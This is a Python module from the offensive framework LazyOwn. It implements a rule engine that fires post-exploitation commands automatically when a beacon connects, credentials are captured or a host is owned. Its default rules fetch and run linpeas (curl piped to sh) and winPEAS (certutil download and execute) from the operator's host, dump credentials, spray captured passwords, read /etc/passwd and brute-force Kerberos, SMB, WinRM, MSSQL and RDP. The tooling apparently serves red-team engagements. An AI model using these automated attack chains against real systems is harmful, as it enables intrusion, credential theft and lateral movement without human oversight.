"""Conditional Hooks System for LazyOwn (Mythic-style triggers).

Lets operators define WHEN->THEN rules that fire automatically on
engagement events: beacon connection, credential capture, privilege
escalation, host discovery, service detection.

Rules are stored as JSON and evaluated in-process. Multiple actions per
trigger, with cooldown to prevent spam. Inspired by Mythic's eventing
system but implemented natively.

Usage
-----
    from modules.conditional_hooks import HookEngine

    engine = HookEngine()
    engine.add_rule({
        "name": "auto-seatbelt-on-beacon",
        "trigger": {"event": "beacon_connected"},
        "actions": [{"type": "run_command", "command": "seatbelt -group=all"}],
        "cooldown_seconds": 300,
    })
    engine.fire("beacon_connected", {"client_id": "abc123"})
"""

from __future__ import annotations

import json
import logging
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path
from typing import Any

log = logging.getLogger("conditional_hooks")

_SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"
_RULES_FILE = _SESSIONS_DIR / "conditional_hooks.json"
_DEFAULT_RULES_FILE = Path(__file__).parent / "hooks_defaults.json"


@dataclass
class HookRule:
    """A single WHEN->THEN rule."""

    name: str
    trigger: dict[str, Any]
    actions: list[dict[str, Any]]
    cooldown_seconds: float = 0.0
    enabled: bool = True
    _last_fired: float = 0.0
    _fire_count: int = 0

    def can_fire(self, now: float | None = None) -> bool:
        if not self.enabled:
            return False
        if now is None:
            now = time.time()
        if self.cooldown_seconds <= 0:
            return True
        return (now - self._last_fired) >= self.cooldown_seconds

    def mark_fired(self) -> None:
        self._last_fired = time.time()
        self._fire_count += 1

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "trigger": self.trigger,
            "actions": self.actions,
            "cooldown_seconds": self.cooldown_seconds,
            "enabled": self.enabled,
        }


DEFAULT_RULES: list[dict[str, Any]] = [
    {
        "name": "auto-baseline-on-first-beacon",
        "trigger": {"event": "beacon_connected"},
        "actions": [
            {"type": "run_command", "command": "whoami"},
            {"type": "run_command", "command": "hostname"},
            {"type": "run_command", "command": "ipconfig /all || ifconfig || ip a"},
            {"type": "run_command", "command": "net user || cat /etc/passwd | head -20"},
        ],
        "cooldown_seconds": 0,
    },
    {
        "name": "auto-netstat-on-beacon",
        "trigger": {"event": "beacon_connected"},
        "actions": [
            {"type": "run_command", "command": "netstat -an | findstr LISTEN || ss -tlnp"},
        ],
        "cooldown_seconds": 300,
    },
    {
        "name": "auto-screenshot-on-exploit",
        "trigger": {"event": "host_exploited"},
        "actions": [
            {"type": "run_command", "command": "screenshot"},
        ],
        "cooldown_seconds": 120,
    },
    {
        "name": "auto-spray-on-cred-capture",
        "trigger": {"event": "credential_captured"},
        "actions": [
            {"type": "credential_reuse_check"},
            {"type": "run_command", "command": "lazyspray"},
        ],
        "cooldown_seconds": 60,
    },
    {
        "name": "auto-loot-on-privesc",
        "trigger": {"event": "privilege_escalated"},
        "actions": [
            {"type": "run_command", "command": "whoami /priv"},
            {"type": "run_command", "command": "lazydump"},
        ],
        "cooldown_seconds": 0,
    },
    {
        "name": "auto-enum-on-new-host",
        "trigger": {"event": "host_discovered"},
        "actions": [
            {"type": "run_scan_command", "command": "lazynmap"},
        ],
        "cooldown_seconds": 600,
    },
    {
        "name": "auto-web-enum-on-http",
        "trigger": {"event": "service_detected", "port": 80},
        "actions": [
            {"type": "run_command", "command": "gobuster dir -u http://{rhost}:80 -w /usr/share/wordlists/dirb/common.txt"},
        ],
        "cooldown_seconds": 1800,
    },
    {
        "name": "auto-smb-enum-on-445",
        "trigger": {"event": "service_detected", "port": 445},
        "actions": [
            {"type": "run_command", "command": "crackmapexec smb {rhost} --shares"},
            {"type": "run_command", "command": "smbmap -H {rhost}"},
        ],
        "cooldown_seconds": 600,
    },
    {
        "name": "auto-kerberos-on-88",
        "trigger": {"event": "service_detected", "port": 88},
        "actions": [
            {"type": "run_command", "command": "kerbrute userenum --dc {rhost} -d {domain} {usrwordlist}"},
        ],
        "cooldown_seconds": 3600,
    },
    {
        "name": "auto-winrm-on-5985",
        "trigger": {"event": "service_detected", "port": 5985},
        "actions": [
            {"type": "run_command", "command": "crackmapexec winrm {rhost} -u '{username}' -p '{password}'"},
        ],
        "cooldown_seconds": 120,
    },
    {
        "name": "auto-mssql-on-1433",
        "trigger": {"event": "service_detected", "port": 1433},
        "actions": [
            {"type": "run_command", "command": "crackmapexec mssql {rhost} -u '{username}' -p '{password}'"},
        ],
        "cooldown_seconds": 120,
    },
    {
        "name": "auto-rdp-on-3389",
        "trigger": {"event": "service_detected", "port": 3389},
        "actions": [
            {"type": "run_command", "command": "crackmapexec rdp {rhost} -u '{username}' -p '{password}'"},
        ],
        "cooldown_seconds": 120,
    },
    {
        "name": "auto-privesc-on-beacon-linux",
        "trigger": {"event": "beacon_connected", "platform": "linux"},
        "actions": [
            {"type": "notify", "message": "Foothold obtained on Linux host {ip}. Queuing linpeas enumeration."},
            {"type": "run_command", "command": "curl -s http://{lhost}:8000/linpeas.sh | sh"},
        ],
        "cooldown_seconds": 600,
    },
    {
        "name": "auto-privesc-on-beacon-windows",
        "trigger": {"event": "beacon_connected", "platform": "windows"},
        "actions": [
            {"type": "notify", "message": "Foothold obtained on Windows host {ip}. Queuing winPEAS enumeration."},
            {"type": "run_command", "command": "certutil -urlcache -f http://{lhost}:8000/winPEASx64.exe C:\\Windows\\Temp\\w.exe && C:\\Windows\\Temp\\w.exe"},
        ],
        "cooldown_seconds": 600,
    },
    {
        "name": "auto-crystal-ball-on-peas-output",
        "trigger": {"event": "command_executed", "command_contains": "linpeas"},
        "actions": [
            {"type": "notify", "message": "linpeas output received from {ip}. Run crystal_ball --auto to analyse."},
        ],
        "cooldown_seconds": 300,
    },
    {
        "name": "auto-crystal-ball-on-winpeas-output",
        "trigger": {"event": "command_executed", "command_contains": "winpeas"},
        "actions": [
            {"type": "notify", "message": "winpeas output received from {ip}. Run crystal_ball --auto to analyse."},
        ],
        "cooldown_seconds": 300,
    },
    {
        "name": "auto-loot-on-owned",
        "trigger": {"event": "host_owned"},
        "actions": [
            {"type": "notify", "message": "Host {ip} is OWNED. Dumping credentials and discovering network."},
            {"type": "run_command", "command": "lazydump"},
            {"type": "run_command", "command": "netstat -an | findstr LISTENING || ss -tlnp"},
            {"type": "run_command", "command": "arp -a || ip neigh show"},
        ],
        "cooldown_seconds": 0,
    },
]

_VALID_EVENTS = frozenset({
    "beacon_connected",
    "beacon_disconnected",
    "host_discovered",
    "host_scanned",
    "host_enumerated",
    "host_exploited",
    "host_owned",
    "service_detected",
    "credential_captured",
    "credential_confirmed",
    "privilege_escalated",
    "vulnerability_found",
    "objective_completed",
    "engagement_started",
    "engagement_phase_changed",
    "command_executed",
    "scan_completed",
})


class HookEngine:
    """Match events against rules and execute matching actions.

    Usage::

        engine = HookEngine()
        engine.fire("beacon_connected", {"client_id": "abc", "platform": "windows"})

    Rules are loaded from ``sessions/conditional_hooks.json`` with
    built-in defaults as fallback.
    """

    def __init__(self) -> None:
        self._rules: list[HookRule] = []
        self._lock = threading.Lock()
        self._action_handlers: dict[str, Callable] = {}
        self._placeholders: dict[str, str] = {}
        self.load_rules()

    def register_action_handler(self, action_type: str, handler: Callable) -> None:
        """Register a handler for a custom action type.

        Args:
            action_type: String identifier (e.g. ``"run_command"``).
            handler: Callable receiving ``(action: dict, context: dict)``.
        """
        self._action_handlers[action_type] = handler

    def set_placeholders(self, placeholders: dict[str, str]) -> None:
        """Set placeholder values for command templating (rhost, lhost, etc.)."""
        self._placeholders.update(placeholders)

    def load_rules(self, path: Path | None = None) -> None:
        """Load rules from JSON file, or create it with defaults.

        Args:
            path: Optional path to rules JSON. Defaults to sessions/conditional_hooks.json.
        """
        if path is None:
            path = _RULES_FILE

        if not path.exists():
            _SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(DEFAULT_RULES, indent=2))
            self._rules = [HookRule(**r) for r in DEFAULT_RULES]
            return

        try:
            data = json.loads(path.read_text())
            self._rules = [HookRule(**r) for r in data]
            existing_names = {r["name"] for r in data if isinstance(r, dict)}
            new_rules: list[dict[str, Any]] = []
            for dr in DEFAULT_RULES:
                if isinstance(dr, dict) and dr.get("name") not in existing_names:
                    self._rules.append(HookRule(**dr))
                    new_rules.append(dr)
            if new_rules:
                data.extend(new_rules)
                path.write_text(json.dumps(data, indent=2))
                log.info("Merged %d new default hook rule(s)", len(new_rules))
        except (json.JSONDecodeError, TypeError) as exc:
            log.warning("Failed to load rules from %s: %s", path, exc)
            self._rules = [HookRule(**r) for r in DEFAULT_RULES]

    def save_rules(self, path: Path | None = None) -> None:
        """Persist current rules to JSON."""
        if path is None:
            path = _RULES_FILE
        _SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
        data = [r.to_dict() for r in self._rules]
        path.write_text(json.dumps(data, indent=2))

    def add_rule(self, rule_dict: dict[str, Any]) -> HookRule:
        """Add a rule at runtime.

        Args:
            rule_dict: Dictionary with HookRule fields.

        Returns:
            The new :class:`HookRule`.
        """
        with self._lock:
            rule = HookRule(**rule_dict)
            self._rules.append(rule)
            self.save_rules()
            return rule

    def remove_rule(self, name: str) -> bool:
        """Remove a rule by name.

        Returns:
            True if removed, False if not found.
        """
        with self._lock:
            before = len(self._rules)
            self._rules = [r for r in self._rules if r.name != name]
            if len(self._rules) < before:
                self.save_rules()
                return True
            return False

    def enable_rule(self, name: str, enabled: bool = True) -> bool:
        """Enable or disable a rule by name."""
        with self._lock:
            for rule in self._rules:
                if rule.name == name:
                    rule.enabled = enabled
                    self.save_rules()
                    return True
            return False

    def _match_trigger(
        self, rule_trigger: dict[str, Any], event: str, context: dict[str, Any]
    ) -> bool:
        """Check if a rule's trigger matches the given event and context.

        Supports field-level matching: if the trigger specifies ``port: 80``,
        it only matches when ``context.port == 80``.

        Suffix keys:
            ``key_contains``: substring match (case-insensitive).
            ``key``: exact match (case-insensitive for strings).
            ``key`` as list: context value must be in the list (case-insensitive for strings).
        """
        rule_event = rule_trigger.get("event", "")
        if rule_event != event:
            return False

        for key, value in rule_trigger.items():
            if key == "event":
                continue

            if key.endswith("_contains"):
                base_key = key[:-len("_contains")]
                ctx_val = str(context.get(base_key, "")).lower()
                search_val = str(value).lower()
                if ctx_val.find(search_val) < 0:
                    return False
                continue

            if key not in context:
                return False

            ctx_val = context[key]
            if isinstance(value, list):
                if isinstance(ctx_val, str):
                    if ctx_val.lower() not in [str(v).lower() for v in value]:
                        return False
                elif ctx_val not in value:
                    return False
            elif isinstance(ctx_val, str) and isinstance(value, str):
                if ctx_val.lower() != value.lower():
                    return False
            elif ctx_val != value:
                return False

        return True

    def _resolve_placeholders(self, text: str, context: dict[str, Any]) -> str:
        """Replace {key} placeholders with values from context or globals."""
        result = text
        for key, val in self._placeholders.items():
            result = result.replace("{" + key + "}", str(val))
        for key, val in context.items():
            if isinstance(val, (str, int, float)):
                result = result.replace("{" + key + "}", str(val))
        return result

    def _execute_action(self, action: dict[str, Any], context: dict[str, Any]) -> Any:
        """Execute a single action and return its result."""
        action_type = action.get("type", "")

        handler = self._action_handlers.get(action_type)
        if handler:
            return handler(action, context)

        if action_type == "run_command":
            command = self._resolve_placeholders(action.get("command", ""), context)
            return self._execute_shell_command(command, context)

        if action_type == "run_scan_command":
            command = self._resolve_placeholders(action.get("command", ""), context)
            return self._execute_shell_command(command, context)

        if action_type == "credential_reuse_check":
            return self._execute_cred_reuse(context)

        if action_type == "notify":
            message = self._resolve_placeholders(action.get("message", ""), context)
            log.info("[hook] %s: %s", action.get("name", "hook"), message)
            return message

        if action_type == "log":
            message = self._resolve_placeholders(action.get("message", ""), context)
            log.info("[hook] %s", message)
            return message

        if action_type == "run_local":
            command = action.get("command", "")
            if command:
                cmd_resolved = self._resolve_placeholders(command, context)
                return self._execute_local_command(cmd_resolved)
            return None

        log.debug("Unknown action type: %s", action_type)
        return None

    def _execute_shell_command(self, command: str, context: dict[str, Any]) -> Any:
        """Execute a shell command via the run_command infra if available."""
        client_id = context.get("client_id")
        if client_id and self._action_handlers.get("run_command"):
            return self._action_handlers["run_command"](
                {"command": command, "client_id": client_id}, context
            )

        return self._execute_local_command(command)

    @staticmethod
    def _execute_local_command(command: str) -> Any:
        """Run a command locally via subprocess.

        Args:
            command: Shell command string to execute.

        Returns:
            Captured stdout, stderr, or None on failure.
        """
        import subprocess

        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=30
            )
            log.info(
                "[hook] local command: %s -> exit=%d", command, result.returncode
            )
            return result.stdout or result.stderr
        except Exception as exc:
            log.warning("[hook] local command failed: %s -> %s", command, exc)
            return None

    def _execute_cred_reuse(self, context: dict[str, Any]) -> Any:
        """Trigger credential reuse engine analysis."""
        try:
            from modules.credential_reuse import get_credential_reuse_engine
            from modules.state_manager import StateManager

            engine = get_credential_reuse_engine()
            state = StateManager()
            candidates = engine.suggest_from_state_manager(state, limit=10)
            summary = engine.get_summary(candidates)
            log.info("[cred_reuse] %s", summary)
            return candidates
        except Exception as exc:
            log.warning("[cred_reuse] failed: %s", exc)
            return None

    def fire(self, event: str, context: dict[str, Any] | None = None) -> list[dict[str, Any]]:
        """Fire an event, evaluating all matching rules.

        Args:
            event: Event type (must be in ``_VALID_EVENTS``).
            context: Key-value data about the event.

        Returns:
            List of dicts with ``rule``, ``action``, and ``result`` keys.
        """
        if event not in _VALID_EVENTS:
            log.debug("Ignoring unknown event: %s", event)
            return []

        if context is None:
            context = {}

        results: list[dict[str, Any]] = []

        with self._lock:
            now = time.time()
            for rule in self._rules:
                if not self._match_trigger(rule.trigger, event, context):
                    continue
                if not rule.can_fire(now):
                    continue

                rule.mark_fired()
                for action in rule.actions:
                    try:
                        result = self._execute_action(action, context)
                        results.append({
                            "rule": rule.name,
                            "action": action,
                            "result": result,
                        })
                    except Exception as exc:
                        log.exception(
                            "[hook] Rule %s action %s failed: %s",
                            rule.name,
                            action.get("type", "?"),
                            exc,
                        )
                        results.append({
                            "rule": rule.name,
                            "action": action,
                            "error": str(exc),
                        })

        return results

    def list_rules(self) -> list[dict[str, Any]]:
        """Return all rules as dictionaries."""
        return [r.to_dict() for r in self._rules]

    def get_rule(self, name: str) -> dict[str, Any] | None:
        """Return a single rule by name, or None."""
        for r in self._rules:
            if r.name == name:
                return r.to_dict()
        return None


_GLOBAL_HOOK_ENGINE: HookEngine | None = None


def get_hook_engine() -> HookEngine:
    """Return the singleton :class:`HookEngine`."""
    global _GLOBAL_HOOK_ENGINE
    if _GLOBAL_HOOK_ENGINE is None:
        _GLOBAL_HOOK_ENGINE = HookEngine()
    return _GLOBAL_HOOK_ENGINE
